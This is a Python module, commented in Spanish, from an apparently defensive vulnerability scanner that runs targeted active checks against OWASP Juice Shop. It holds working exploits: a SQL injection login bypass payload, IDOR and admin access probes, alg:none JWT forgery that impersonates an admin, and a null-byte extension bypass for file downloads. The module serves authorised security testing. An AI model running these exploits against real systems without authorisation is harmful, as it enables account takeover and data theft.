"""Chequeos de detección DIRIGIDA — escaneo activo de alta confianza.

Por qué existe (medición real, no hipótesis)
--------------------------------------------
Un DAST genérico (ZAP baseline + plantillas CVE de Nuclei) mide **recall 0.0**
contra las 11 vulnerabilidades de `eval/ground_truth.yaml` (OWASP Juice Shop):
de toda la salida cruda del escáner autenticado, un solo hallazgo era una
vuln explotable, y ni siquiera cruzaba el ground truth. Ver
`eval/failure_log.md` (filas Grupo 3, 2026-07-25) y
`openspec/changes/fase8-motor-deteccion/`. La conclusión medida fue explícita:
`recall >= 0.5` NO es alcanzable tuneando ZAP+Nuclei — las clases que faltan
(inyección de autenticación, control de acceso / IDOR, exposición de archivos,
path traversal, validación de JWT) son lógica de negocio y control de acceso
que un crawler+fuzzer genérico no confirma sin casos de prueba dirigidos.

Este módulo son esos casos de prueba dirigidos. Cada chequeo envía tráfico de
ataque específico y **solo reporta un hallazgo cuando tiene evidencia concreta
de explotación exitosa** — recibió datos de otro usuario, la ruta protegida
respondió 200, el token falsificado fue aceptado, el bypass de whitelist
descargó un archivo bloqueado por la vía directa. Nada de "este endpoint
podría ser vulnerable": cada chequeo compara la respuesta al ataque contra una
respuesta de **control** (credenciales inválidas, token basura, acceso directo
bloqueado) y solo dispara si el ataque tuvo éxito Y el control falló. Esa
verificación de dos lados es lo que previene falsos positivos (estándar del
dueño: "sin falsos positivos, sin dar falsos verdes").

REGLA DE SEGURIDAD — esto es ESCANEO ACTIVO
-------------------------------------------
Estos chequeos envían tráfico de prueba contra la aplicación objetivo. Por lo
tanto:

- Solo se ejecutan detrás del gate de autorización existente
  (`orchestrator/graph.py::gate_autorizacion` para el grafo, y la verificación
  `autorizacion_firmada` + `_asset_verificado_para_target` de `POST /scan/activo`
  para el camino de background). Mismo camino, mismas garantías que Nuclei/ZAP.
- **NUNCA** se exponen como `@tool` de LangChain ni entran a `tools/registry.py`
  (ese registro es SOLO para tools pasivas — ver su docstring, la razón es
  legal: escaneo activo sin autorización firmada es delito bajo la Ley 1273).

Contrato de un hallazgo
-----------------------
`HallazgoDirigido.ubicacion` es el ACTIVO afectado (el asset que un reporte de
pentest citaría, p.ej. el panel de administración o el endpoint de login). El
detalle técnico exacto de QUÉ se probó (endpoint concreto, método, códigos de
estado, snippet de la respuesta) vive SIEMPRE en `evidencia`, para que
cualquier auditoría vea con precisión qué request demostró la vulnerabilidad.
"""

from __future__ import annotations

import base64
import json
import secrets
from dataclasses import dataclass, field
from typing import Any, Optional

try:
    import requests
    from requests import Session
except ImportError as exc:  # pragma: no cover - requests es dependencia base
    raise ImportError(
        "El módulo de detección dirigida requiere 'requests' (pip install requests)."
    ) from exc


# ---------------------------------------------------------------------------
# Modelo
# ---------------------------------------------------------------------------

@dataclass
class HallazgoDirigido:
    """Un hallazgo confirmado por explotación exitosa.

    tipo:       tipo canónico del ground truth (sql_injection, jwt_vuln, ...).
    severidad:  critical | high | medium | low.
    ubicacion:  activo afectado (endpoint/ruta que un reporte citaría).
    evidencia:  prueba concreta de explotación (request probado + respuestas).
    descripcion: descripción legible corta.
    confianza:  0-1; 1.0 porque solo se construye con evidencia de éxito.
    """

    tipo: str
    severidad: str
    ubicacion: str
    descripcion: str
    evidencia: dict = field(default_factory=dict)
    confianza: float = 1.0


# Credenciales de laboratorio generadas al vuelo (nunca fijas ni reutilizadas):
# los chequeos de control de acceso necesitan cuentas de prueba propias en el
# target autorizado. Password fuerte para no chocar con políticas del backend.
_PWD_LAB = "Vig1a-Lab!" + secrets.token_hex(4)


def _correo_lab() -> str:
    return f"vigia_lab_{secrets.token_hex(6)}@vigia-scan.local"


def _base(target_url: str) -> str:
    return target_url.rstrip("/")


def _b64url(raw: bytes) -> bytes:
    return base64.urlsafe_b64encode(raw).rstrip(b"=")


# ---------------------------------------------------------------------------
# Helpers de sesión de laboratorio (registro + login en el target)
# ---------------------------------------------------------------------------

@dataclass
class _UsuarioLab:
    email: str
    token: str
    user_id: Optional[int]
    basket_id: Optional[Any]


def _registrar_y_login(base: str, session: Session, timeout: int) -> Optional[_UsuarioLab]:
    """Registra una cuenta de prueba en el target y hace login.

    Devuelve None (sin lanzar) si el target no soporta el flujo de registro
    tipo Juice Shop — los chequeos que dependen de esto simplemente no
    disparan, que es el comportamiento seguro (mejor no reportar que reportar
    de más).
    """
    email = _correo_lab()
    try:
        reg = session.post(
            f"{base}/api/Users/",
            json={
                "email": email,
                "password": _PWD_LAB,
                "passwordRepeat": _PWD_LAB,
                "securityQuestion": {"id": 1},
                "securityAnswer": "vigia",
            },
            timeout=timeout,
        )
        if reg.status_code not in (200, 201):
            return None
        log = session.post(
            f"{base}/rest/user/login",
            json={"email": email, "password": _PWD_LAB},
            timeout=timeout,
        )
        if log.status_code != 200:
            return None
        auth = (log.json() or {}).get("authentication", {})
        token = auth.get("token")
        if not token:
            return None
        return _UsuarioLab(
            email=email,
            token=token,
            user_id=_extraer_user_id_de_jwt(token),
            basket_id=auth.get("bid"),
        )
    except (requests.RequestException, ValueError):
        return None


def _extraer_user_id_de_jwt(token: str) -> Optional[int]:
    try:
        payload = json.loads(base64.urlsafe_b64decode(token.split(".")[1] + "=="))
        return payload.get("data", {}).get("id")
    except (ValueError, IndexError, KeyError):
        return None


# ---------------------------------------------------------------------------
# Chequeos dirigidos (cada uno: ataque vs control, dispara solo con evidencia)
# ---------------------------------------------------------------------------

def check_sqli_login(base: str, session: Session, timeout: int) -> Optional[HallazgoDirigido]:
    """SQLi de bypass de autenticación en el login.

    Éxito: un payload de inyección devuelve un token de sesión SIN credenciales
    válidas. Control: credenciales aleatorias inválidas (sin inyección) son
    rechazadas. Dispara solo si el ataque autentica Y el control es rechazado
    -- así no marca una app que devuelve 200 a todo login.
    """
    control_email = f"{secrets.token_hex(8)}@nope.invalid"
    try:
        control = session.post(
            f"{base}/rest/user/login",
            json={"email": control_email, "password": secrets.token_hex(8)},
            timeout=timeout,
        )
        control_token = _token_de(control)
        if control.status_code == 200 and control_token:
            # La app autentica cualquier cosa: no es SQLi, es login roto/otra
            # clase. No la atribuimos a inyección (evita FP).
            return None

        payload = "' OR 1=1--"
        atk = session.post(
            f"{base}/rest/user/login",
            json={"email": payload, "password": secrets.token_hex(8)},
            timeout=timeout,
        )
        atk_token = _token_de(atk)
        if atk.status_code == 200 and atk_token:
            return HallazgoDirigido(
                tipo="sql_injection",
                severidad="critical",
                ubicacion="/rest/user/login",
                descripcion=(
                    "Bypass de autenticación por inyección SQL en el login: el "
                    f"payload {payload!r} en el campo email devuelve un token de "
                    "sesión válido sin credenciales."
                ),
                evidencia={
                    "endpoint_probado": "/rest/user/login",
                    "metodo": "POST",
                    "payload": payload,
                    "control_status": control.status_code,
                    "control_autentico": bool(control_token),
                    "ataque_status": atk.status_code,
                    "ataque_autentico": True,
                },
            )
    except requests.RequestException:
        return None
    return None


def check_idor_basket(base: str, session: Session, timeout: int) -> Optional[HallazgoDirigido]:
    """IDOR: un usuario lee la cesta de otro cambiando el id.

    Registra dos usuarios A y B. A lee su propia cesta (baseline del UserId
    propio) y luego la cesta de B. Éxito: la cesta de B responde 200 con un
    UserId distinto al de A. Control implícito: si respondiera 401/403 o
    devolviera la propia cesta de A, no dispara.
    """
    try:
        a = _registrar_y_login(base, session, timeout)
        b = _registrar_y_login(base, session, timeout)
        if not a or not b or a.basket_id is None or b.basket_id is None:
            return None
        if str(a.basket_id) == str(b.basket_id):
            return None

        cabecera_a = {"Authorization": f"Bearer {a.token}"}
        propia = session.get(f"{base}/rest/basket/{a.basket_id}", headers=cabecera_a, timeout=timeout)
        user_id_propio = _user_id_de_basket(propia) if propia.status_code == 200 else a.user_id

        ajena = session.get(f"{base}/rest/basket/{b.basket_id}", headers=cabecera_a, timeout=timeout)
        if ajena.status_code != 200:
            return None
        user_id_ajena = _user_id_de_basket(ajena)
        # Evidencia dura: la cesta ajena pertenece a OTRO usuario.
        if user_id_ajena is None or user_id_propio is None:
            return None
        if str(user_id_ajena) == str(user_id_propio):
            return None
        return HallazgoDirigido(
            tipo="broken_access_control",
            severidad="high",
            ubicacion="/rest/basket/{id}",
            descripcion=(
                "IDOR: el token del usuario A recupera la cesta del usuario B "
                f"(basket id={b.basket_id}, UserId={user_id_ajena}) sin verificación "
                "de propiedad del recurso."
            ),
            evidencia={
                "endpoint_probado": f"/rest/basket/{b.basket_id}",
                "metodo": "GET",
                "usuario_atacante_id": user_id_propio,
                "recurso_ajeno_owner_id": user_id_ajena,
                "status": ajena.status_code,
                "cuerpo_recibido": ajena.text[:300],
            },
        )
    except requests.RequestException:
        return None


def check_admin_broken_access(base: str, session: Session, timeout: int) -> Optional[HallazgoDirigido]:
    """Control de acceso roto en funciones de administración.

    Un endpoint admin-only debe rechazar peticiones sin autorización. Éxito:
    un usuario NO administrador recién registrado obtiene 200 con datos de
    múltiples usuarios. Control: sin token, el mismo endpoint responde 401/403
    (confirma que SÍ está protegido y no es público por diseño).
    """
    endpoint = "/rest/user/authentication-details"
    try:
        sin_auth = session.get(f"{base}{endpoint}", timeout=timeout)
        if sin_auth.status_code not in (401, 403):
            # Público por diseño (o no existe): no es un fallo de control de
            # acceso demostrable. No dispara.
            return None

        usuario = _registrar_y_login(base, session, timeout)
        if not usuario:
            return None
        cabecera = {"Authorization": f"Bearer {usuario.token}"}
        con_auth = session.get(f"{base}{endpoint}", headers=cabecera, timeout=timeout)
        if con_auth.status_code != 200:
            return None
        usuarios = _contar_usuarios_distintos(con_auth, usuario.user_id)
        if usuarios < 2:
            # Solo ve sus propios datos: eso NO es fuga admin. No dispara.
            return None
        return HallazgoDirigido(
            tipo="broken_access_control",
            severidad="critical",
            ubicacion="/#/administration",
            descripcion=(
                "Control de acceso roto en administración: un usuario NO admin "
                f"recién creado recupera datos de {usuarios} usuarios vía el "
                "endpoint admin-only de detalles de autenticación."
            ),
            evidencia={
                "endpoint_probado": endpoint,
                "metodo": "GET",
                "sin_auth_status": sin_auth.status_code,
                "usuario_normal_status": con_auth.status_code,
                "usuarios_distintos_expuestos": usuarios,
            },
        )
    except requests.RequestException:
        return None


def check_jwt_alg_none(base: str, session: Session, timeout: int) -> Optional[HallazgoDirigido]:
    """Validación de JWT rota: se acepta un token firmado con `alg:none`.

    Éxito: se forja un token con cabecera `alg:none` (sin firma) escalando la
    identidad, y un endpoint protegido lo acepta (200). Control: el mismo
    endpoint rechaza (401/403) un token basura -- prueba que SÍ valida algo, y
    que aceptar el forjado significa que no verifica la firma.
    """
    endpoint = "/rest/user/authentication-details"
    try:
        usuario = _registrar_y_login(base, session, timeout)
        if not usuario:
            return None

        # Control: token basura debe ser rechazado.
        basura = session.get(
            f"{base}{endpoint}",
            headers={"Authorization": "Bearer aaa.bbb.ccc"},
            timeout=timeout,
        )
        if basura.status_code not in (401, 403):
            # El endpoint no valida tokens: no se puede atribuir a JWT roto.
            return None

        forjado = _forjar_jwt_alg_none(usuario.token)
        if forjado is None:
            return None
        atk = session.get(
            f"{base}{endpoint}",
            headers={"Authorization": f"Bearer {forjado}"},
            timeout=timeout,
        )
        if atk.status_code != 200:
            return None
        return HallazgoDirigido(
            tipo="jwt_vuln",
            severidad="high",
            ubicacion="/rest/user/login",
            descripcion=(
                "El servidor acepta un JWT forjado con `alg:none` (sin firma): "
                "un token basura es rechazado (401/403) pero el forjado con la "
                "identidad manipulada es aceptado (200)."
            ),
            evidencia={
                "endpoint_probado": endpoint,
                "metodo": "GET",
                "token_basura_status": basura.status_code,
                "token_forjado_alg": "none",
                "token_forjado_status": atk.status_code,
            },
        )
    except requests.RequestException:
        return None


def check_ftp_exposure(base: str, session: Session, timeout: int) -> Optional[HallazgoDirigido]:
    """Exposición de archivos sensibles vía directorio ftp público.

    Éxito: GET /ftp/ responde 200 y el cuerpo lista archivos sensibles
    (respaldos .bak, documentos internos). No dispara con un 200 cualquiera:
    exige señales de listado de archivos sensibles en el cuerpo.
    """
    try:
        r = session.get(f"{base}/ftp/", timeout=timeout)
        if r.status_code != 200:
            return None
        cuerpo = (r.text or "").lower()
        indicadores = [".bak", "acquisitions", "coupons", "package.json", ".md.bak", "eastere"]
        vistos = [i for i in indicadores if i in cuerpo]
        if len(vistos) < 2:
            return None
        return HallazgoDirigido(
            tipo="sensitive_data_exposure",
            severidad="high",
            ubicacion="/ftp/",
            descripcion=(
                "Directorio ftp expone públicamente archivos sensibles "
                f"(indicadores hallados en el listado: {', '.join(vistos)})."
            ),
            evidencia={
                "endpoint_probado": "/ftp/",
                "metodo": "GET",
                "status": r.status_code,
                "indicadores_hallados": vistos,
            },
        )
    except requests.RequestException:
        return None


def check_path_traversal_ftp(base: str, session: Session, timeout: int) -> Optional[HallazgoDirigido]:
    """Path traversal / bypass de whitelist en descarga de archivos ftp.

    Éxito: el acceso directo a un archivo no permitido (p.ej. .bak) está
    bloqueado (403/404), pero un byte nulo codificado (`%2500.md`) evade el
    filtro de extensión y descarga el archivo (200 con contenido). El contraste
    bloqueado-vs-descargado ES la prueba del bypass.
    """
    archivo = "package.json.bak"
    try:
        directo = session.get(f"{base}/ftp/{archivo}", timeout=timeout)
        # Si el acceso directo YA es 200, no hay bypass que demostrar (el
        # archivo simplemente es público -> eso lo cubre check_ftp_exposure).
        if directo.status_code not in (403, 404):
            return None
        bypass = session.get(f"{base}/ftp/{archivo}%2500.md", timeout=timeout)
        if bypass.status_code != 200 or not (bypass.text or "").strip():
            return None
        return HallazgoDirigido(
            tipo="path_traversal",
            severidad="high",
            ubicacion="/ftp/:file",
            descripcion=(
                f"Bypass de whitelist de extensión por byte nulo: /ftp/{archivo} "
                f"está bloqueado ({directo.status_code}) pero "
                f"/ftp/{archivo}%2500.md descarga el archivo (200)."
            ),
            evidencia={
                "endpoint_probado": f"/ftp/{archivo}%2500.md",
                "metodo": "GET",
                "acceso_directo_status": directo.status_code,
                "bypass_status": bypass.status_code,
                "bytes_descargados": len(bypass.text or ""),
            },
        )
    except requests.RequestException:
        return None


# ---------------------------------------------------------------------------
# Utilidades de parsing (tolerantes a respuestas no-JSON / inesperadas)
# ---------------------------------------------------------------------------

def _token_de(resp) -> Optional[str]:
    try:
        return (resp.json() or {}).get("authentication", {}).get("token")
    except (ValueError, AttributeError):
        return None


def _user_id_de_basket(resp) -> Optional[Any]:
    try:
        return (resp.json() or {}).get("data", {}).get("UserId")
    except (ValueError, AttributeError):
        return None


def _contar_usuarios_distintos(resp, propio_id) -> int:
    """Cuenta cuántos usuarios distintos revela una respuesta admin-only."""
    try:
        data = (resp.json() or {}).get("data")
    except (ValueError, AttributeError):
        return 0
    if not isinstance(data, list):
        return 0
    ids = set()
    for fila in data:
        if isinstance(fila, dict):
            fid = fila.get("id") or fila.get("email")
            if fid is not None:
                ids.add(fid)
    return len(ids)


def _forjar_jwt_alg_none(token_valido: str) -> Optional[str]:
    """Construye un JWT `alg:none` a partir de un payload válido, escalando la
    identidad a un correo de administrador típico. Sin firma (tercer segmento
    vacío)."""
    try:
        partes = token_valido.split(".")
        payload = json.loads(base64.urlsafe_b64decode(partes[1] + "=="))
    except (ValueError, IndexError):
        return None
    if isinstance(payload.get("data"), dict):
        payload["data"]["email"] = "admin@juice-sh.op"
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    return (h + b"." + p + b".").decode()


# ---------------------------------------------------------------------------
# Orquestación
# ---------------------------------------------------------------------------

# Orden estable, documentado. Cada entrada: (nombre, función).
CHEQUEOS = (
    ("sqli_login", check_sqli_login),
    ("idor_basket", check_idor_basket),
    ("admin_broken_access", check_admin_broken_access),
    ("jwt_alg_none", check_jwt_alg_none),
    ("ftp_exposure", check_ftp_exposure),
    ("path_traversal_ftp", check_path_traversal_ftp),
)


def ejecutar_checks_dirigidos(
    target_url: str,
    *,
    session: Optional[Session] = None,
    timeout: int = 8,
) -> list[HallazgoDirigido]:
    """Corre todos los chequeos dirigidos contra `target_url` y devuelve los
    hallazgos con evidencia de explotación.

    Degradación con gracia: un fallo aislado de un chequeo (excepción de red,
    respuesta inesperada) NO tumba a los demás — se ignora ese chequeo y se
    sigue. Nunca lanza hacia el llamador; en el peor caso devuelve lista vacía.

    Este es escaneo ACTIVO: el llamador es responsable de haberlo puesto detrás
    del gate de autorización (ver docstring del módulo).
    """
    base = _base(target_url)
    propia_sesion = session is None
    sess = session or requests.Session()
    hallazgos: list[HallazgoDirigido] = []
    try:
        for _nombre, funcion in CHEQUEOS:
            try:
                resultado = funcion(base, sess, timeout)
            except Exception:  # noqa: BLE001 — un chequeo no debe tumbar a los otros
                resultado = None
            if resultado is not None:
                hallazgos.append(resultado)
    finally:
        if propia_sesion:
            sess.close()
    return hallazgos
